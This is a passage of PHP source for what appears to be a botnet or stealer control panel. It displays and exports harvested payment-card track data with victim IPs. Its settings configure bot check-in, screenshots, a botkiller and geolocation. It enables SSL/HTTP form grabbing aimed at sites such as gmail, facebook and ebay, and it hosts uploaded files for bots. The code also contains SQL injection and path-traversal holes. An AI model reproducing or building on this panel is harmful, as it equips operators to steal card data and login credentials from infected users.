                QueryRedirect($mysqli, 'DELETE FROM ' . DB_DUMPS . ' WHERE client_data_hash="' . $current_track_hash . '"', PAGE_DUMPS);
                break;
            }
            case 'deleteall': {
                QueryRedirect($mysqli, 'truncate ' . DB_DUMPS . '', PAGE_DUMPS);
                break;
            }
        }
    }

    if ($current_page > 0) {
        $sql .= ' LIMIT ' . floor($current_page * PAGE_LIMIT) . ', ' . PAGE_LIMIT . '';
    } else {
        $sql .= ' LIMIT 0, ' . PAGE_LIMIT . '';
    }

    $qstring = $_SERVER['QUERY_STRING'];
    $q_str = explode('&', $qstring);
    $str = '';

    foreach ($q_str as $s_str) {
        if (strstr($s_str, 'page'))
            break;
        else
            $str .= htmlspecialchars($s_str) . "&";
    }

    $start_page = abs($current_page * PAGE_LIMIT);
    $res = $mysqli->query($sql);

    ?>
    <div class="panel panel-primary" style="width: 90%;margin: 0 auto;overflow: hidden;">
    <div class="panel-heading"><b>Dumps (<?php echo $dumps_count; ?>)</b></div>
    <form action="<?php echo htmlentities($_SERVER['PHP_SELF']); ?>" method="GET" class="navbar-form navbar-right" role="search" style="margin-right: 1px;">
        <input type="hidden" name="act" value="dumps">
        <div class="form-group form-group-sm">
            <input class="form-control" name="search_by_data" placeholder="Search by track data" type="text" value="<?php echo $is_search; ?>">
        </div>
        <button type="submit" class="btn btn-default btn-sm">Search</button>
        <?php
        if ($is_search) {
            echo '<button type="submit" class="btn btn-warning btn-sm" name="mode" value="reset">Reset</button>';
        }
        ?>
        <div class="btn-group">
            <a href="#" class="btn btn-default btn-sm" data-toggle="dropdown">Menu<span class="caret"></span></a>
            <ul style="z-index: 999;" class="dropdown-menu">
                <li>
                    <a href="<?php echo $link_download_dumps; ?>"><span class="glyphicon glyphicon-floppy-saved"></span> Download dumps</a>
                </li>
                <li role="separator" class="divider"></li>
                <li>
                    <a href="#" onclick="ConfirmDelete('<?php echo $link_delete_dumps ?>'); return false;"><span class="glyphicon glyphicon-floppy-remove"></span> Delete all dumps</a>
                </li>
            </ul>
        </div>
        <input type="hidden" name="csrf" value="<?php echo $_SESSION['csrf'] ?>">
    </form>

    <div class="panel-body">
    <?php
    echo '<table style="font-size:9pt;" class="table table-striped table-condensed table-hover">'
        . '<th>#</th>'
        . '<th><b>ID</th>'
        . '<th><b>IP</th>'
        . '<th><b>Track data</th>'
        . '<th><b>Process name</th>'
        . '<th><b>Date / Time</th>'
        . '<th><b>Action</th>';

    for ($i = 0; $i < $res->num_rows; $i++) {

        $row = $res->fetch_assoc();
        $track_data_name = ($row['client_data_type']);
        $track_data_value = base64_decode($row['client_data']);

        echo '<tbody><tr>'
            . '<td><b>' . $i . '<b></td>'
            . '<td><a href = "?act=grabber&show_by_id=' . $row['client_id'] . '" title="Show client logs">' . $row['client_id'] . '</td>'
            . '<td>' . $row['client_ip'] . '</td>'
            . '<td>'
            . '<div class="input-group input-group-sm">'
            . '<span class="input-group-addon">' . $track_data_name . '</span>'
            . '<input class="form-control" type="text" value="' . $track_data_value . '">'
            . '</div>'
            . '</td>'
            . '<td>' . $row['client_process_name'] . '</td>'
            . '<td>' . $row['client_date'] . '</td>'
            . '<td><a href="?act=dumps&mode=delete&track_hash=' . $row['client_data_hash'] . '&csrf=' . $_SESSION['csrf'] . '&form=kill" title="Delete"><span class="glyphicon glyphicon-remove"></span></a></td></tr>';
    }
    echo '<tbody></table>';
    GetPagination($current_page, $str, $pages_count);
    echo '</div></div>';
}
if ($_act === 'settings') {

    echo
        '<div class="panel panel-primary" style="width: 80%;margin: 0 auto;overflow: hidden;">' .
        '<div class="panel-heading"><b>Settings</b></div>' .
        '<div class="panel-body">';

    echo
        '<ul class="nav nav-tabs">' .
        '<li><a href="' . PAGE_SETTINGS . '">Settings</a></li>';
    if ($_account_type == USER_ROOT) {
        echo '<li><a href="' . PAGE_AC_SETTINGS . '">Accounts</a></li>';
    }
    echo
        '<li><a href="' . PAGE_BL_SETTINGS . '">BlackList</a></li>' .
        '<li><a href="' . PAGE_GR_SETTINGS . '">Grabber setting</a></li>' .
        '</ul>' .
        '<div class="tab-content">';

    if ($_do == null) {

        if (array_key_exists('save', $_POST) && $_SESSION['csrf'] == $_POST['csrf']) {

            if (array_key_exists('knock_rate', $_POST)) {
                $set_knock_rate = (int)$_POST['knock_rate'];

                if ($set_knock_rate > MAX_KNOCK_RATE)
                    $set_knock_rate = 5;

                $mysqli->query('UPDATE ' . DB_CONFIG . ' SET config_value = "' . time() . mt_rand(111111, 999999) . '" WHERE config_name = "knock_rate_id"');
                $mysqli->query('UPDATE ' . DB_CONFIG . ' SET config_value = "' . $set_knock_rate . '" WHERE config_name = "knock_rate"');
            }

            if (isset($_POST['ban_enabled']) == 'checked') {
                $mysqli->query('UPDATE ' . DB_CONFIG . ' SET config_value = "1" WHERE config_name = "ban_enabled"');
            } else {
                $mysqli->query('UPDATE ' . DB_CONFIG . ' SET config_value = "0" WHERE config_name = "ban_enabled"');
            }

            if (isset($_POST['screenshot_enabled']) == 'checked') {
                $mysqli->query('UPDATE ' . DB_CONFIG . ' SET config_value = "1" WHERE config_name = "screenshot_enabled"');
            } else {
                $mysqli->query('UPDATE ' . DB_CONFIG . ' SET config_value = "0" WHERE config_name = "screenshot_enabled"');
            }

            if (isset($_POST['botkiller_enabled']) == 'checked') {
                $mysqli->query('UPDATE ' . DB_CONFIG . ' SET config_value = "1" WHERE config_name = "botkiller_enabled"');
            } else {
                $mysqli->query('UPDATE ' . DB_CONFIG . ' SET config_value = "0" WHERE config_name = "botkiller_enabled"');
            }

            if (isset($_POST['geo_enabled']) == 'checked') {
                $mysqli->query('UPDATE ' . DB_CONFIG . ' SET config_value = "1" WHERE config_name = "geo_enabled"');
            } else {
                $mysqli->query('UPDATE ' . DB_CONFIG . ' SET config_value = "0" WHERE config_name = "geo_enabled"');
            }
            touch(SETTINGS_FILE);

        }

        $config_knock_rate = $mysqli->query('SELECT config_value FROM ' . DB_CONFIG . ' WHERE config_name = "knock_rate"')->fetch_object()->config_value;
        $config_ban_state = $mysqli->query('SELECT config_value FROM ' . DB_CONFIG . ' WHERE config_name = "ban_enabled"')->fetch_object()->config_value ? 'checked' : '';
        $config_screenshot_state = $mysqli->query('SELECT config_value FROM ' . DB_CONFIG . ' WHERE config_name = "screenshot_enabled"')->fetch_object()->config_value ? 'checked' : '';
        $config_botkiller_state = $mysqli->query('SELECT config_value FROM ' . DB_CONFIG . ' WHERE config_name = "botkiller_enabled"')->fetch_object()->config_value ? 'checked' : '';
        $config_geo_state = $mysqli->query('SELECT config_value FROM ' . DB_CONFIG . ' WHERE config_name = "geo_enabled"')->fetch_object()->config_value ? 'checked' : '';

        echo
            '<div class="tab-pane active" id="settings">' .
            '<form method="POST" action="">' .
            '<br>' .
            '<div class="input-group">' .
            '<span class="input-group-addon">Knock timeout (min.) :</span>' .
            '<input type="text" id="knock_rate" class="form-control" style="width: 85%" name="knock_rate" value="' . $config_knock_rate . '">' .
            '</div>' .
            '<div class="checkbox" style="text-align: left">' .
            '<label>' .
            '<input type="checkbox" ' . $config_ban_state . ' name="ban_enabled" value="' . $config_ban_state . '"> Enable ban system' .
            '</label>' .
            '<br>' .
            '<label>' .
            '<input type="checkbox" ' . $config_screenshot_state . ' name="screenshot_enabled" value="' . $config_screenshot_state . '"> Take screenshot after run?' .
            '</label>' .
            '<br>' .
            '<label>' .
            '<input type="checkbox" ' . $config_botkiller_state . ' name="botkiller_enabled" value="' . $config_botkiller_state . '"> Enable botkiller' .
            '</label>' .
            '<br>' .
            '<label>' .
            '<input type="checkbox" ' . $config_geo_state . ' name="geo_enabled" value="' . $config_geo_state . '"> Enable geolocation' .
            '</label>' .
            '</div>' .
            '<input class="btn btn-primary pull-right btn-xs" type="submit" style="margin: 1%;" name="save" value="Save settings">' .
            '<input name="csrf" type="hidden" value="' . $_SESSION["csrf"] . '">' .
            '</form>' .
            '</div>';
    }
    if ($_do == 'accounts') {
        if ($_account_type == USER_ROOT) {

            if (array_key_exists('add_account', $_POST) && $_SESSION['csrf'] == $_POST['csrf']) {

                $add_username = array_key_exists('new_username', $_POST) ? htmlspecialchars($mysqli->real_escape_string($_POST['new_username'])) : 0;
                $add_password = array_key_exists('new_password', $_POST) ? htmlspecialchars($mysqli->real_escape_string($_POST['new_password'])) : 0;

                if ($add_username && $add_password) {
                    AddUser($mysqli, $add_username, $add_password);
                }
            }
            if (array_key_exists('delete_account', $_GET) && $_SESSION['csrf'] == $_GET['csrf']) {

                $delete_account = htmlspecialchars($mysqli->escape_string($_GET['delete_account']));
                if (strcasecmp($delete_account, USER_ROOT) != 0)
                    $mysqli->query('DELETE FROM ' . DB_USERS . ' WHERE client_username="' . $delete_account . '"');
            }

            echo
                '<form method="POST" action="">' .
                '<br>' .
                '<div class="form-group">' .
                '<label class="control-label">New user :</label>' .
                '<div class="input-group">' .
                '<span class="input-group-addon">Username</span>' .
                '<input class="form-control" id="new_username" name="new_username" type="text">' .
                '<span class="input-group-addon">Password</span>' .
                '<input class="form-control" id="new_password" name="new_password" type="text">' .
                '<span class="input-group-btn">' .
                '<button class="btn btn-primary" name="add_account" type="submit">Add new user</button>' .
                '</span>' .
                '</div>' .
                '</div>' .
                '<input name="csrf" type="hidden" value="' . $_SESSION["csrf"] . '">' .
                '</form>';

            $res = $mysqli->query('SELECT * FROM ' . DB_USERS . '');
            if ($res->num_rows != 0) {
                echo '<br><table class="table table-condensed table-hover">' .
                    '<tr>' .
                    '<th style="text-align: center">#</th>' .
                    '<th>Username</th>' .
                    '<th>Password</th>' .
                    '<th style="text-align: left">Type</th>' .
                    '<th style="text-align: center">Action</th>' .
                    '</tr><tbody>';

                for ($i = 0; $i < $res->num_rows; $i++) {
                    $row = $res->fetch_assoc();
                    echo
                        '<tr>' .
                        '<td style="text-align: center"><b>' . $i . '</td>' .
                        '<td>' . $row['client_username'] . '</td>' .
                        '<td>*******************</td>';

                    if ($row['client_id'] == USER_ROOT) {
                        echo "<td style=\"text-align: left;vertical-align:middle;\"><span class='label label-danger'><i>" . $row['client_id'] . "</i></span></td><td></td>";
                    } else {
                        echo "<td style=\"text-align: left;vertical-align:middle;\"><span class='label label-default'><i>" . $row['client_id'] . "</i></span></td>";
                        echo "<td style=\"text-align: center\"><a href = \"?act=settings&do=accounts&delete_account=" . urlencode($row["client_username"]) . "&csrf=" . $_SESSION["csrf"] . "\" title='Delete acoount'><span class='glyphicon glyphicon-trash'></a></td>";
                    }
                    echo '</tr>';
                }
                echo '</tbody></table>';
            }
        }
    }
    if ($_do == 'blacklist') {

        if (array_key_exists('delete_ban', $_GET) && $_SESSION['csrf'] == $_GET['csrf']) {
            QueryRedirect($mysqli, 'DELETE FROM ' . DB_BAN . ' WHERE client_ban_hash = "' . $_GET['delete_ban'] . '"', PAGE_BL_SETTINGS);
        }

        if (array_key_exists('add_ban_sumbit', $_POST) && $_SESSION['csrf'] == $_POST['csrf']) {

            $add_ban_id_ip = array_key_exists('client_id_ip', $_POST) ? htmlspecialchars($mysqli->real_escape_string($_POST['client_id_ip'])) : 0;
            $add_ban_reason = array_key_exists('client_ban_reason', $_POST) ? htmlspecialchars($mysqli->real_escape_string($_POST['client_ban_reason'])) : '';
            $add_ban_hash = array_key_exists('client_ban_reason', $_POST) ? htmlspecialchars($mysqli->real_escape_string($_POST['client_ban_reason'])) : 0;

            if ($add_ban_id_ip) {
                $add_ban_hash = md5($add_ban_id_ip);
                $date_time = date('Y-m-d H:i:s');
                QueryRedirect($mysqli, 'REPLACE INTO ' . DB_BAN . ' (client_id_ip, client_useragent, client_referrer, client_ban_reason, client_ban_date_time, client_ban_hash)
			       VALUES ("' . $add_ban_id_ip . '", "0", "0", "' . $add_ban_reason . '", "' . $date_time . '", "' . $add_ban_hash . '")', PAGE_BL_SETTINGS);
            }
        }

        echo
            '<form method="POST" action="">' .
            '<br>' .
            '<div class="form-group">' .
            '<div class="input-group">' .
            '<span class="input-group-addon">IP/ID</span>' .
            '<input class="form-control" id="client_id_ip" name="client_id_ip" type="text">' .
            '<span class="input-group-addon">Reason</span>' .
            '<input class="form-control" id="client_ban_reason" name="client_ban_reason" type="text">' .
            '<span class="input-group-btn">' .
            '<button class="btn btn-primary" name="add_ban_sumbit" type="submit">Add ban</button>' .
            '</span>' .
            '</div>' .
            '</div>' .
            '<input name="csrf" type="hidden" value="' . $_SESSION["csrf"] . '">' .
            '</form>';

        $banned_ip = null;
        $res = $mysqli->query('SELECT * FROM ' . DB_BAN . ';');
        if ($res) {
            if ($res->num_rows != 0) {

                $geo_db = new \IP2Location\Database('./IP2Location/IP-COUNTRY.BIN', \IP2Location\Database::FILE_IO);
                echo '<br><table class="table table-condensed table-hover">' .
                    '<tr>' .
                    '<th>#</th>' .
                    '<th>Country</th>' .
                    '<th>IP / ID</th>' .
                    '<th>Reason</th>' .
                    '<th>Date / Time</th>' .
                    '<th style="text-align: center">Action</th>' .
                    '<tr><tbody>';

                for ($i = 0; $i < $res->num_rows; $i++) {
                    $row = $res->fetch_assoc();

                    $client_ip = $row['client_id_ip'];
                    $client_country = $geo_db->lookup($client_ip, \IP2Location\Database::ALL);
                    $client_country_alt = '';

                    if ($client_country['ipNumber'] == false) {
                        $client_country['ipAddress'] = $client_ip;
                        $client_country['countryCode'] = 'O1';
                        $client_country['countryName'] = 'Unknown';
                        $client_country_alt = 'Unknown';
                    } else {
                        $client_country_alt = $client_country['countryName'] . ' (' . $client_country['countryCode'] . ')';
                    }

                    echo '<tr><td><b>' . $i . '</td>' .
                        '<td style="vertical-align:middle;">' . ShowFlag($client_country['countryCode'], $client_country_alt) . " " . $client_country_alt . '</td>' .
                        '<td>' . $client_ip . '</td>' .
                        '<td>' . my_substr($row['client_ban_reason'], 50) . '</td>' .
                        '<td>' . $row['client_ban_date_time'] . '</td>' .
                        '<td style="text-align: center;"><a href = "?act=settings&do=blacklist&delete_ban=' . $row['client_ban_hash'] . '&csrf=' . $_SESSION['csrf'] . '" title=Delete><span class="glyphicon glyphicon-trash"></a></td></tr>';
                }
                echo '</tbody></table>';
            }
        }
    }
    if ($_do == 'grabber') {

        if (array_key_exists('save', $_POST) && $_SESSION['csrf'] == $_POST['csrf']) {

            if (array_key_exists('grabber_blacklist', $_POST))
                $mysqli->query('UPDATE ' . DB_CONFIG . ' SET config_value = "' . $_POST['grabber_blacklist'] . '" WHERE config_name = "grabber_blacklist"');


            if (array_key_exists('grabber_whitelist', $_POST))
                $mysqli->query('UPDATE ' . DB_CONFIG . ' SET config_value = "' . $_POST['grabber_whitelist'] . '" WHERE config_name = "grabber_whitelist"');


            if (isset($_POST['grabber_plain_state']) == 'checked')
                $mysqli->query('UPDATE ' . DB_CONFIG . ' SET config_value = "1" WHERE config_name = "grabber_plain"');
            else
                $mysqli->query('UPDATE ' . DB_CONFIG . ' SET config_value = "0" WHERE config_name = "grabber_plain"');


            if (isset($_POST['grabber_secure_state']) == 'checked')
                $mysqli->query('UPDATE ' . DB_CONFIG . ' SET config_value = "1" WHERE config_name = "grabber_secure"');
            else
                $mysqli->query('UPDATE ' . DB_CONFIG . ' SET config_value = "0" WHERE config_name = "grabber_secure"');


            if (isset($_POST['grabber_parse_extra_state']) == 'checked')
                $mysqli->query('UPDATE ' . DB_CONFIG . ' SET config_value = "1" WHERE config_name = "grabber_parse_extra"');
            else
                $mysqli->query('UPDATE ' . DB_CONFIG . ' SET config_value = "0" WHERE config_name = "grabber_parse_extra"');

            touch(SETTINGS_FILE);
        }

        $config_grabber_plain_state = $mysqli->query('SELECT config_value FROM ' . DB_CONFIG . ' WHERE config_name = "grabber_plain"')->fetch_object()->config_value ? 'checked' : '';
        $config_grabber_secure_state = $mysqli->query('SELECT config_value FROM ' . DB_CONFIG . ' WHERE config_name = "grabber_secure"')->fetch_object()->config_value ? 'checked' : '';
        $config_grabber_parse_extra_state = $mysqli->query('SELECT config_value FROM ' . DB_CONFIG . ' WHERE config_name = "grabber_parse_extra"')->fetch_object()->config_value ? 'checked' : '';

        $config_grabber_whitelist = $mysqli->query('SELECT config_value FROM ' . DB_CONFIG . ' WHERE config_name = "grabber_whitelist"')->fetch_object()->config_value;
        $config_grabber_blacklist = $mysqli->query('SELECT config_value FROM ' . DB_CONFIG . ' WHERE config_name = "grabber_blacklist"')->fetch_object()->config_value;

        echo
            '<form method="POST" action="">' .

            '<div class="checkbox">' .
            '<label>' .
            '<input type="checkbox" name="grabber_secure_state" value="grabber_secure_state" ' . $config_grabber_secure_state . ' >Enable SSL grabber </label>' .
            '</div>' .

            '<div class="checkbox">' .
            '<label>' .
            '<input type="checkbox" name="grabber_plain_state" value="grabber_plain_state" ' . $config_grabber_plain_state . ' >Enable HTTP grabber </label>' .
            '</div>' .

            '<div class="checkbox">' .
            '<label>' .
            '<input type="checkbox" name="grabber_parse_extra_state" value="grabber_parse_extra_state" ' . $config_grabber_parse_extra_state . ' >Enable form preprocessing </label>' .
            '</div>' .

            '<div class="input-group">' .
            '<span class="input-group-addon"> Filter : </span>' .
            '<input type="text" class="form-control" id="grabber_whitelist" name="grabber_whitelist" value="' . $config_grabber_whitelist . '">' .
            '<span class="input-group-addon"><a href="#" onclick="bootbox.alert(\'Type capture_all for disable filter and grabbing requests from all hosts.<br>If you want grab requests from specific hosts, just type hostnames, example : *gmail*,*facebook*,*ebay*\');return false;"><span class="glyphicon glyphicon-question-sign"></span></a></span>' .
            '</div>' .

            '<br>' .
            '<div class="form-group">' .
            '<label for="blacklisted">Blacklist :</label>' .
            '<textarea class="form-control" rows="1" cols="70" onfocus="this.rows = 9" onblur="this.rows = 1" name="grabber_blacklist">' . $config_grabber_blacklist . '</textarea>' .
            '</div>' .

            '<div style="text-align: right">' .
            '<input type="submit" style="text-align: center;margin: 1%;" name="save" class="btn btn-xs btn-primary" value="Save settings">' .
            '<input name="csrf" type="hidden" value="' . $_SESSION['csrf'] . '">' .
            '</div>' .
            '</div>';
    }
}
if ($_act === 'upload') {

    if (array_key_exists('delete', $_GET) && $_SESSION['csrf'] === $_GET['csrf']) {
        $_delete_file = DIR_UPLOAD . '/' . $_GET['delete'];

        if (is_file($_delete_file) && file_exists($_delete_file)) {
            unlink($_delete_file);
        }
        MessageRedirect(PAGE_UPLOAD);
    }

    if (count($_FILES) !== 0 && $_SESSION['csrf'] === $_POST['csrf']) {

        foreach ($_FILES['upfiles']['error'] as $key => $error) {
            if ((int)$error === UPLOAD_ERR_OK) {
                $_file_name = strtolower($_FILES['upfiles']['name'][$key]);
                $_temp_file_name = $_FILES['upfiles']['tmp_name'][$key];
                $_dest_full_path = DIR_UPLOAD . '/' . $_file_name;

                if (move_uploaded_file($_temp_file_name, $_dest_full_path)) {
                    chmod($_dest_full_path, 0644);
                }
            }
        }
    }

    echo '<div class="panel panel-primary" style="width: 80%;margin: 0 auto;overflow: hidden;">' .
        '<div class="panel-heading"><b>Upload</b></div>' .
        '<div class="panel-body">' .
        '<form action="" method="POST" enctype="multipart/form-data" accept-charset="UTF-8">' .
        '<input type="file" class="file-loading" id="upfiles" name="upfiles[]" data-show-preview="false">' .
        '<input name="csrf" type="hidden" value="' . $_SESSION['csrf'] . '">' .
        '</form></div>' .
        '<script>' .
        '$("#upfiles").fileinput();' .
        '</script>';

    echo '<table class="table table-responsive table-striped table-condensed table-hover">' .
        '<th width="65%">Filename</th>' .
        '<th width="15%"> Date </th>' .
        '<th width="10%"> Size </th>' .
        '<th width="5%"> Action </th>' .
        '<tbody>';

    $_n_delete = array('.', '..', 'index.html', 'index.php', '.htaccess');

    if ($_files_dir = opendir(DIR_UPLOAD)) {
        while ($_filename = readdir($_files_dir)) {
            if (!in_array($_filename, $_n_delete, true)) {

                $_file_path = DIR_UPLOAD . '/' . $_filename;
                $_file_url = $_main_url . DIR_UPLOAD . '/' . $_filename;
                $_file_size = filesize(DIR_UPLOAD . '/' . $_filename);

                if ($_file_size >= 1024) {
                    $_file_size = sprintf('%1.2f', $_file_size / 1024) . ' KB';
                } else {
                    $_file_size = $_file_size . ' B';
                }
                $_file_date = date('Y-m-d H:i:s', filemtime(DIR_UPLOAD . '/' . $_filename));

                echo '<tr class="active">' .
                    '<td  width="65%" style="text-align: left"><input size="100" style="background-color:transparent !important;border:none !important;" onclick="this.select();" type="text"
                    value="' . $_file_url . '" /> ' .
                    '<td width="15%" style="text-align: left">' . $_file_date . '</td>' .
                    '<td width="10%" style="text-align: left">' . $_file_size . '</td>' .
                    '<td width="5%"><a href="' . DIR_UPLOAD . '/' . $_filename . '" title = "Download"><span class="glyphicon glyphicon-save"></span></a>' .
                    '<a href="' . $_SERVER['PHP_SELF'] . '?act=' . DIR_UPLOAD . '&delete=' . $_filename . '&csrf=' . $_SESSION['csrf'] . '" title = "Delete"><span class="glyphicon glyphicon-trash"></span></a></td>' .
                    '</tr>';
            }
        }
        closedir($_files_dir);
    }
    echo '</tbody></table> '
        . '</div></div></div>';
}
if ($_act === 'logout') {
    session_destroy();
    echo '<script>Logout();</script>';
}
echo '</body></html>';
$mysqli->close();